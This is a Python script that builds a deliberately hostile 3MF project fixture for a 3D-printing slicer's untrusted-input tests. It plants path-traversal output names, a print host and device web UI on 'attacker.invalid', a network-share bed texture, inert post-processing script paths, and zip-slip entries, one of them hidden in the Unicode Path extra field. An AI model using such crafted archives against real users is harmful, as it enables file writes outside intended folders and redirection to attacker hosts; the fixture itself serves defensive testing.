# Builds post_process_project.3mf, the fixture for tests/libslic3r/test_untrusted_input.cpp.
#
# It is the small Bambu project from ../bambu_compat_3mf/auto_pa_line_dual.3mf plus what an
# untrusted project could carry:
#   - project settings with a post-processing script, an output name that climbs out of the output
#     folder, a print host and a bed texture on a network share;
#   - an embedded print preset with its own post-processing script;
#   - an embedded printer preset pointing the Device tab at a foreign web UI;
#   - archive entries whose names climb out of the extraction folders (zip-slip).
# The "scripts" are inert marker paths that do not exist; the tests only check that they are found
# and stripped, nothing is ever run.
#
# Run: python make_fixture.py   (from this folder)
import json
import struct
import zipfile
import zlib

SRC = '../bambu_compat_3mf/auto_pa_line_dual.3mf'
DST = 'post_process_project.3mf'

PROJECT_SCRIPT = r'C:\edge-test-does-not-exist\edge_pp_marker_project.exe'
EMBEDDED_SCRIPT = r'C:\edge-test-does-not-exist\edge_pp_marker_embedded.exe'

src = zipfile.ZipFile(SRC)
out = zipfile.ZipFile(DST, 'w', zipfile.ZIP_DEFLATED)
for info in src.infolist():
    data = src.read(info.filename)
    if info.filename == 'Metadata/project_settings.config':
        cfg = json.loads(data)
        cfg['post_process'] = [PROJECT_SCRIPT]
        cfg['filename_format'] = r'..\..\{input_filename_base}.gcode'
        cfg['print_host'] = 'http://attacker.invalid'
        # Stored C-escaped, the way the slicer writes this key (the value is \\attacker.invalid\share\bed.png).
        cfg['bed_custom_texture'] = r'\\\\attacker.invalid\\share\\bed.png'
        data = json.dumps(cfg, indent=4).encode('utf-8')
    out.writestr(info.filename, data)

out.writestr('Metadata/process_settings_1.config', json.dumps({
    'from': 'User',
    'name': 'Evil Process',
    'print_settings_id': 'Evil Process',
    'inherits': '0.20mm Standard @BBL H2D',
    'version': '02.00.02.01',
    'post_process': [EMBEDDED_SCRIPT],
}, indent=4))
out.writestr('Metadata/machine_settings_1.config', json.dumps({
    'from': 'User',
    'name': 'Evil Printer',
    'printer_settings_id': 'Evil Printer',
    'inherits': 'Bambu Lab H2D 0.4 nozzle',
    'version': '02.00.02.01',
    'print_host': 'http://attacker.invalid',
    'print_host_webui': 'http://attacker.invalid/ui',
}, indent=4))

out.writestr('Auxiliaries/Other Files/readme.txt', 'an ordinary attachment\n')
# zip-slip: both would land two folders above the extraction folder (still inside the slicer's
# temp tree) without the path check.
out.writestr('Auxiliaries/../../edge_zipslip_aux.txt', 'EDGE_ZIPSLIP_MARKER\n')
out.writestr('Metadata/../../edge_zipslip_meta.gcode', 'EDGE_ZIPSLIP_MARKER\n')
# The reader already skipped names containing "/../". But for an entry without the UTF-8 flag the
# auxiliary extractor takes the name from the Info-ZIP Unicode Path extra field (0x7075), which was
# never checked: a harmless-looking name with a climbing path in the extra field.
benign = 'Auxiliaries/benign.txt'
climb = b'Auxiliaries/../../edge_zipslip_unicode.txt'
info = zipfile.ZipInfo(benign)
info.compress_type = zipfile.ZIP_DEFLATED
field = struct.pack('<B', 1) + struct.pack('<I', zlib.crc32(benign.encode()) & 0xffffffff) + climb
# The reader wants bytes after the field, so a zero-length padding field follows.
info.extra = struct.pack('<HH', 0x7075, len(field)) + field + struct.pack('<HH', 0xcafe, 0)
out.writestr(info, 'EDGE_ZIPSLIP_MARKER\n')
out.close()
print('wrote', DST)
